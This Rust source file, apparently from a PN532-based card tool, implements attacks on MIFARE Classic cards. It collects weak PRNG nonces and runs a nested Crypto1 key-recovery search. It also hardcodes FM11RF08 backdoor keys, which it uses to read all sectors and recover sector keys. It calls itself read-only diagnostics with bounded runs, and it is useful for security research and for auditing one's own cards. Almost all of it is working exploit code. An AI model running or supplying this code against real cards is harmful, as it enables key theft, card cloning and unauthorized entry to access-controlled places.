// SPDX-License-Identifier: GPL-3.0-or-later
//! Local, read-only authentication diagnostics and nested recovery.
//! Authentication sequence adapted from mfoc (GPL-2.0-or-later), see THIRD_PARTY.md.
use crate::crypto1::{self, Crypto1, odd_parity, successor};
use crate::{
    document::Card,
    pn532::{Reader, capacity},
};
use anyhow::{Result, ensure};
use serde::{Deserialize, Serialize};
use std::collections::{BTreeMap, BTreeSet};

/// ISO14443A CRC (initial value 0x6363, reflected polynomial 0x8408).
pub fn crc_a(data: &[u8]) -> [u8; 2] {
    let mut crc = 0x6363u16;
    for byte in data {
        crc ^= u16::from(*byte);
        for _ in 0..8 {
            crc = (crc >> 1) ^ if crc & 1 != 0 { 0x8408 } else { 0 };
        }
    }
    crc.to_le_bytes()
}

#[derive(Debug, Serialize, Deserialize)]
pub struct NonceReport {
    pub card: Card,
    pub block: usize,
    pub key_type: String,
    pub nonces: Vec<String>,
    pub distinct: usize,
    pub weak_prng_samples: usize,
    pub conclusion: String,
}

pub fn diagnose(
    reader: &mut Reader,
    block: usize,
    kind: &str,
    samples: usize,
    mut progress: impl FnMut(String),
) -> Result<NonceReport> {
    ensure!((2..=64).contains(&samples), "采样次数必须为 2–64");
    ensure!(["A", "B"].contains(&kind), "密钥类型必须为 A 或 B");
    let card = reader.select(None)?;
    ensure!(block < capacity(&card)?, "块号超过卡片容量");
    let mut nonces = Vec::new();
    for i in 0..samples {
        reader.check_cancel()?;
        // A fresh field/select prevents the previous authentication from encrypting Nt.
        reader.select(Some(&card.uid))?;
        reader.register_bits(0x6338, 0x08, 0)?;
        let mut auth = vec![if kind == "A" { 0x60 } else { 0x61 }, block as u8];
        auth.extend(crc_a(&auth));
        let nonce = reader.raw_bytes(&auth, false)?;
        ensure!(
            nonce.len() == 4,
            "认证随机数应为 4 字节，实际 {} 字节",
            nonce.len()
        );
        nonces.push(hex::encode_upper(nonce));
        progress(format!("随机数采样 {}/{samples}", i + 1));
        // Restore standard framing before the next select (and before returning).
        reader.register_bits(0x6302, 0x80, 0x80)?;
        reader.register_bits(0x6303, 0x80, 0x80)?;
    }
    reader.select(Some(&card.uid))?;
    let distinct = nonces.iter().collect::<BTreeSet<_>>().len();
    let weak_prng_samples = nonces
        .iter()
        .filter(|n| u32::from_str_radix(n, 16).is_ok_and(crypto1::weak_nonce))
        .count();
    let conclusion = if distinct == 1 {
        "本次复位采样随机数固定；这是恢复方法选择的线索，不代表密钥已恢复。"
    } else if weak_prng_samples == samples {
        "样本全部符合 Classic 弱随机数关系；可继续尝试本地 nested 恢复，仍需验证候选密钥。"
    } else {
        "本次采样随机数变化；尚不能仅凭不同样本判断 nested / hardnested 是否适用。"
    }
    .to_owned();
    Ok(NonceReport {
        card,
        block,
        key_type: kind.into(),
        nonces,
        distinct,
        weak_prng_samples,
        conclusion,
    })
}

fn word(data: &[u8]) -> Result<u32> {
    ensure!(data.len() == 4, "认证响应不是 32 位");
    Ok(u32::from_be_bytes(data.try_into()?))
}

fn encrypted_frame(state: &mut Crypto1, plain: &[u8]) -> (Vec<u8>, Vec<u8>) {
    let mut data = Vec::new();
    let mut parity = Vec::new();
    for byte in plain {
        data.push(state.byte(0, false) ^ byte);
        parity.push(crypto1::filter(state.odd) as u8 ^ odd_parity(*byte));
    }
    (data, parity)
}

struct NestedSample {
    origin: u32,
    encrypted: u32,
    parity: Vec<u8>,
}

/// Authenticate with a known key in software, then request the encrypted target nonce.
fn software_auth(
    reader: &mut Reader,
    uid: &str,
    source: usize,
    key: u64,
    auth_command: u8,
) -> Result<(Crypto1, u32)> {
    reader.standard_framing()?;
    reader.select(Some(uid))?;
    let uid_bytes = hex::decode(uid)?;
    let auth_uid = word(&uid_bytes[uid_bytes.len() - 4..])?;
    let mut auth = vec![auth_command, source as u8];
    auth.extend(crc_a(&auth));
    let nt = word(&reader.raw_bytes(&auth, false)?)?;
    let mut state = Crypto1::new(key);
    state.word(nt ^ auth_uid, false);
    let mut reply = Vec::new();
    let mut parity = Vec::new();
    // Reader nonce is zero; it is fed into the cipher, unlike Ar.
    for _ in 0..4 {
        reply.push(state.byte(0, false));
        parity.push(crypto1::filter(state.odd) as u8 ^ odd_parity(0));
    }
    let (ar, arp) = encrypted_frame(&mut state, &successor(nt, 64).to_be_bytes());
    reply.extend(ar);
    parity.extend(arp);
    let (answer, _) = reader.raw_parity(&reply, &parity)?;
    let origin = successor(nt, 96);
    ensure!(
        word(&answer)? ^ state.word(0, false) == origin,
        "已知密钥的软件认证验证失败"
    );
    Ok((state, origin))
}

fn collect(
    reader: &mut Reader,
    uid: &str,
    source: usize,
    key: u64,
    target: usize,
    kind: &str,
) -> Result<NestedSample> {
    let (mut state, origin) = software_auth(reader, uid, source, key, 0x60)?;
    let mut nested = vec![if kind == "A" { 0x60 } else { 0x61 }, target as u8];
    nested.extend(crc_a(&nested));
    let (data, parity) = encrypted_frame(&mut state, &nested);
    let (nonce, parity) = reader.raw_parity(&data, &parity)?;
    Ok(NestedSample {
        origin,
        encrypted: word(&nonce)?,
        parity,
    })
}

fn nonce_parity(nonce: u32, sample: &NestedSample) -> bool {
    let ks = nonce ^ sample.encrypted;
    let bytes = nonce.to_be_bytes();
    (0..3).all(|i| odd_parity(bytes[i]) == sample.parity[i] ^ ((ks >> (16 - i * 8)) & 1) as u8)
}

fn fudan_nonce(
    reader: &mut Reader,
    uid: &str,
    block: usize,
    key: u64,
    command: u8,
) -> Result<NestedSample> {
    let (mut state, origin) = software_auth(reader, uid, block, key, 0x64)?;
    let mut cmd = vec![command, block as u8];
    cmd.extend(crc_a(&cmd));
    let (data, parity) = encrypted_frame(&mut state, &cmd);
    let (encrypted, parity) = reader.raw_parity(&data, &parity)?;
    Ok(NestedSample {
        origin,
        encrypted: word(&encrypted)?,
        parity,
    })
}

/// Candidate sets from disclosed static nonce, cross-sector key reuse filtering.
/// Only keys that pass ordinary A/B authentication are added to the document.
pub fn fudan_recover(
    reader: &mut Reader,
    mut progress: impl FnMut(String),
) -> Result<crate::document::Document> {
    let mut doc = fudan_read(reader, &mut progress)?;
    let card = reader.select(None)?;
    let uid_bytes = hex::decode(&card.uid)?;
    let uid = word(&uid_bytes[uid_bytes.len() - 4..])?;
    let mut backdoor = None;
    for key in [0xa396efa4e24f, 0xa31667a8cec1, 0x518b3354e760] {
        if software_auth(reader, &card.uid, 0, key, 0x64).is_ok() {
            backdoor = Some(key);
            break;
        }
        reader.check_cancel()?;
    }
    let backdoor = backdoor.ok_or_else(|| anyhow::anyhow!("诊断认证失败"))?;
    let mut sets = Vec::new();
    let mut known = BTreeSet::from([0xffffffffffff, 0xa0a1a2a3a4a5, 0xd3f7d3f7d3f7]);
    for sector in 0..16 {
        for (kind, cmd) in [("A", 0x60), ("B", 0x61)] {
            let mut found = None;
            for key in &known {
                reader.standard_framing()?;
                reader.select(Some(&card.uid))?;
                if reader
                    .auth(sector * 4, kind, &format!("{key:012X}"))
                    .is_ok()
                {
                    found = Some(*key);
                    break;
                }
                reader.check_cancel()?;
            }
            if let Some(key) = found {
                record_key(&mut doc, sector, kind, key)?;
                continue;
            }
            let diagnostic = fudan_nonce(reader, &card.uid, sector * 4, backdoor, cmd + 4)?;
            let mut state = Crypto1::new(backdoor);
            let nonce = diagnostic.encrypted ^ state.word(diagnostic.encrypted ^ uid, true);
            ensure!(crypto1::weak_nonce(nonce), "诊断随机数不符合预期");
            let sample = fudan_nonce(reader, &card.uid, sector * 4, backdoor, cmd)?;
            ensure!(nonce_parity(nonce, &sample), "普通与诊断认证的随机数不匹配");
            let mut candidates = BTreeSet::new();
            for mut state in
                crypto1::recover32(nonce ^ sample.encrypted, nonce ^ uid, &reader.cancel)?
            {
                // Include the last encrypted parity bit, not consumed by Crypto1.
                if (crypto1::filter(state.odd) as u8 ^ odd_parity(nonce as u8)) != sample.parity[3]
                {
                    continue;
                }
                state.rollback_word(nonce ^ uid, false);
                candidates.insert(state.key());
            }
            progress(format!(
                "固定随机数：扇区 {sector} {kind}，{} 个候选",
                candidates.len()
            ));
            sets.push((sector, kind, candidates));
        }
    }
    // Reusing one key across different sectors is common; same-sector identical
    // A/B nonces are not independent evidence and must not inflate this filter.
    for (i, (sector, _, candidates)) in sets.iter().enumerate() {
        for (other, _, rhs) in &sets[i + 1..] {
            if sector == other {
                continue;
            }
            let intersection: Vec<_> = candidates.intersection(rhs).copied().collect();
            if intersection.len() <= 64 {
                known.extend(intersection);
            }
        }
    }
    for (sector, kind, candidates) in sets {
        let mut choices: BTreeSet<_> = candidates.intersection(&known).copied().collect();
        if candidates.len() <= 64 {
            choices.extend(candidates);
        }
        progress(format!(
            "验证扇区 {sector} {kind}：{} 个复用候选",
            choices.len()
        ));
        for key in choices {
            reader.standard_framing()?;
            reader.select(Some(&card.uid))?;
            if reader
                .auth(sector * 4, kind, &format!("{key:012X}"))
                .is_ok()
            {
                record_key(&mut doc, sector, kind, key)?;
                progress(format!("扇区 {sector} {kind} 密钥已通过认证"));
                break;
            }
            reader.check_cancel()?;
        }
    }
    reader.standard_framing()?;
    reader.select(Some(&card.uid))?;
    let verified_keys: Vec<_> = doc
        .keys
        .values()
        .flat_map(|keys| keys.values().cloned())
        .collect::<BTreeSet<_>>()
        .into_iter()
        .collect();
    let verified_count: usize = doc.keys.values().map(BTreeMap::len).sum();
    if verified_count == 32 {
        progress("使用恢复出的普通 A/B 密钥重新读取 64 块".into());
        let reread = reader.read_classic(&verified_keys, 64, &mut progress)?;
        ensure!(
            reread.blocks == doc.blocks && reread.known() == 64,
            "普通密钥重读结果与诊断读取不一致"
        );
        doc.notes.insert("normal_auth_verified".into(), true.into());
        progress("普通认证重读验证通过：64/64 块一致".into());
    }
    Ok(doc)
}

fn record_key(
    doc: &mut crate::document::Document,
    sector: usize,
    kind: &str,
    key: u64,
) -> Result<()> {
    let key = format!("{key:012X}");
    doc.keys
        .entry(sector.to_string())
        .or_default()
        .insert(kind.into(), key.clone());
    if let Some(t) = doc.blocks[sector * 4 + 3].as_mut() {
        let offset = if kind == "A" { 0 } else { 20 };
        t.replace_range(offset..offset + 12, &key);
    }
    Ok(())
}

/// FM11RF08-family documented diagnostic authentication, no card writes.
/// Keys/command documented by RfidResearchGroup/proxmark3 and IACR 2024/1275.
pub fn fudan_read(
    reader: &mut Reader,
    mut progress: impl FnMut(String),
) -> Result<crate::document::Document> {
    let card = reader.select(None)?;
    ensure!(capacity(&card)? == 64, "当前 Fudan 本地读取仅支持 1K 布局");
    let mut found = None;
    for key in [0xa396efa4e24f, 0xa31667a8cec1, 0x518b3354e760] {
        reader.check_cancel()?;
        if software_auth(reader, &card.uid, 0, key, 0x64).is_ok() {
            found = Some(key);
            break;
        }
        reader.check_cancel()?;
    }
    let key =
        found.ok_or_else(|| anyhow::anyhow!("该卡未通过已知 Fudan 诊断认证，不适用此方法"))?;
    progress("Fudan 诊断认证通过，开始只读采集".into());
    let mut doc = crate::document::Document::empty(64)?;
    doc.bind(&card);
    doc.notes.insert("source".into(), "live".into());
    doc.notes.insert(
        "read_method".into(),
        "fudan-diagnostic-authentication".into(),
    );
    for sector in 0..16 {
        let (mut state, _) = software_auth(reader, &card.uid, sector * 4, key, 0x64)?;
        for block in sector * 4..sector * 4 + 4 {
            let mut cmd = vec![0x30, block as u8];
            cmd.extend(crc_a(&cmd));
            let (encrypted, parity) = encrypted_frame(&mut state, &cmd);
            let (data, parities) = reader.raw_parity(&encrypted, &parity)?;
            ensure!(data.len() == 18, "Fudan 块响应长度错误");
            let mut plain = Vec::with_capacity(18);
            for (byte, parity) in data.iter().zip(parities) {
                let byte = byte ^ state.byte(0, false);
                ensure!(
                    parity ^ crypto1::filter(state.odd) as u8 == odd_parity(byte),
                    "Fudan 数据奇偶校验失败"
                );
                plain.push(byte);
            }
            ensure!(
                crc_a(&plain[..16]) == plain[16..],
                "Fudan 数据 CRC 校验失败"
            );
            doc.blocks[block] = Some(hex::encode_upper(&plain[..16]));
        }
        progress(format!(
            "Fudan 扇区 {sector:02}：4/4 块（数据 CRC/奇偶校验通过）"
        ));
    }
    // A backdoor read does not prove the normal sector A/B keys. Do not fabricate them.
    reader.standard_framing()?;
    reader.select(Some(&card.uid))?;
    Ok(doc)
}
fn matches_sample(key: u64, uid: u32, sample: &NestedSample, allowed: &BTreeSet<u32>) -> bool {
    let mut state = Crypto1::new(key);
    let nonce = sample.encrypted ^ state.word(sample.encrypted ^ uid, true);
    allowed.contains(&nonce) && nonce_parity(nonce, sample)
}

/// Bounded weak-PRNG nested recovery. Returns only a key authenticated on this card.
pub fn nested(
    reader: &mut Reader,
    source: usize,
    known: &str,
    target: usize,
    kind: &str,
    mut progress: impl FnMut(String),
) -> Result<Option<String>> {
    ensure!(["A", "B"].contains(&kind), "密钥类型必须为 A 或 B");
    crate::document::bytes(known, Some(6))?;
    let key = u64::from_str_radix(known, 16)?;
    let card = reader.select(None)?;
    ensure!(
        source < capacity(&card)? && target < capacity(&card)?,
        "恢复块号超出容量"
    );
    reader.auth(source, "A", known)?;
    let uid_bytes = hex::decode(&card.uid)?;
    let uid = word(&uid_bytes[uid_bytes.len() - 4..])?;
    let mut distances = Vec::new();
    for _ in 0..5 {
        let sample = collect(reader, &card.uid, source, key, source, "A")?;
        let mut state = Crypto1::new(key);
        let plain = sample.encrypted ^ state.word(sample.encrypted ^ uid, true);
        ensure!(
            crypto1::weak_nonce(plain),
            "加密随机数不符合弱 PRNG，普通 nested 不适用"
        );
        distances.push(
            crypto1::distance(sample.origin, plain)
                .ok_or_else(|| anyhow::anyhow!("随机数距离无法确定"))?,
        );
    }
    distances.sort_unstable();
    let median = distances[2];
    progress(format!(
        "已知密钥软件认证通过；nested 距离中位数 {median}，样本 {distances:?}"
    ));
    // Mac USB scheduling causes much wider timing jitter than a narrow ±20 window.
    // Check subsequent captures directly with each candidate rather than storing
    // millions of candidate keys or repeating the expensive state search.
    let sample = collect(reader, &card.uid, source, key, target, kind)?;
    let verify1 = collect(reader, &card.uid, source, key, target, kind)?;
    let verify2 = collect(reader, &card.uid, source, key, target, kind)?;
    ensure!(
        sample.encrypted != verify1.encrypted
            && sample.encrypted != verify2.encrypted
            && verify1.encrypted != verify2.encrypted,
        "检测到固定加密随机数：普通 nested 不适用，请使用 Fudan 本地读取/恢复。"
    );
    let radius = distances
        .iter()
        .map(|d| (*d as i32 - median as i32).abs())
        .max()
        .unwrap_or(0)
        + 512;
    ensure!(radius <= 4096, "随机数时序波动过大，请重新运行校准");
    progress(format!("搜索距离窗口 ±{radius}；使用另外两份采样筛选候选"));
    let allowed = |sample: &NestedSample| -> BTreeSet<u32> {
        (-radius..=radius)
            .map(|offset| {
                successor(
                    sample.origin,
                    (median as i32 + offset).rem_euclid(65535) as usize,
                )
            })
            .collect()
    };
    let allowed1 = allowed(&verify1);
    let allowed2 = allowed(&verify2);
    let started = std::time::Instant::now();
    let mut tested = BTreeSet::new();
    for step in 0..=radius * 2 {
        reader.check_cancel()?;
        ensure!(
            started.elapsed().as_secs() < 240,
            "本次 nested 达到 240 秒上限，尚未恢复密钥"
        );
        // Search from the median outward so typical distances are attempted first.
        let offset = if step % 2 == 0 {
            step / 2
        } else {
            -(step + 1) / 2
        };
        if step % 32 == 0 {
            progress(format!("距离候选 {step}/{}", radius * 2 + 1));
        }
        let distance = (median as i32 + offset).rem_euclid(65535) as usize;
        let nonce = successor(sample.origin, distance);
        if !nonce_parity(nonce, &sample) {
            continue;
        }
        for mut state in crypto1::recover32(nonce ^ sample.encrypted, nonce ^ uid, &reader.cancel)?
        {
            state.rollback_word(nonce ^ uid, false);
            let candidate = state.key();
            if !matches_sample(candidate, uid, &verify1, &allowed1)
                || !matches_sample(candidate, uid, &verify2, &allowed2)
                || !tested.insert(candidate)
            {
                continue;
            }
            reader.check_cancel()?;
            ensure!(
                started.elapsed().as_secs() < 240 && tested.len() <= 64,
                "候选验证达到本次运行上限，尚未恢复密钥"
            );
            progress(format!("实卡验证候选 {}", tested.len()));
            reader.standard_framing()?;
            reader.select(Some(&card.uid))?;
            let key = format!("{candidate:012X}");
            if reader.auth(target, kind, &key).is_ok() {
                progress("候选密钥已通过实卡认证".into());
                return Ok(Some(key));
            }
            reader.check_cancel()?;
        }
    }
    reader.standard_framing()?;
    reader.select(Some(&card.uid))?;
    Ok(None)
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    #[ignore = "Requires PCR532_TEST_PORT and an authorized card with default A key on blocks 0 and 4"]
    fn hardware_nested_known_key() {
        use std::sync::{Arc, atomic::AtomicBool};
        let port = std::env::var("PCR532_TEST_PORT").unwrap();
        let mut reader = Reader::open(&port, 115200, Arc::new(AtomicBool::new(false))).unwrap();
        let card = reader.select(None).unwrap();
        reader.auth(4, "A", "FFFFFFFFFFFF").unwrap();
        let bytes = hex::decode(&card.uid).unwrap();
        let uid = word(&bytes[bytes.len() - 4..]).unwrap();
        for target in [0, 3, 4, 8] {
            let sample = collect(&mut reader, &card.uid, 0, 0xffffffffffff, target, "A").unwrap();
            let mut state = Crypto1::new(0xffffffffffff);
            let plain = sample.encrypted ^ state.word(sample.encrypted ^ uid, true);
            eprintln!(
                "target {target} distance {:?}, weak {}, parity {}",
                crypto1::distance(sample.origin, plain),
                crypto1::weak_nonce(plain),
                nonce_parity(plain, &sample)
            );
            eprintln!(
                "origin {:08X}, plaintext {:08X}, encrypted {:08X}",
                sample.origin, plain, sample.encrypted
            );
            assert!(nonce_parity(plain, &sample));
            assert!(
                crypto1::recover32(sample.encrypted ^ plain, plain ^ uid, &reader.cancel)
                    .unwrap()
                    .into_iter()
                    .any(|mut s| {
                        s.rollback_word(plain ^ uid, false);
                        s.key() == 0xffffffffffff
                    })
            );
        }
        reader.standard_framing().unwrap();
    }
    #[test]
    fn crc_known_iso14443a_frames() {
        assert_eq!(crc_a(&[0x50, 0]), [0x57, 0xcd]);
        assert_eq!(crc_a(&[0x30, 0]), [0x02, 0xa8]);
        assert_eq!(crc_a(&[]), [0x63, 0x63]);
    }
}
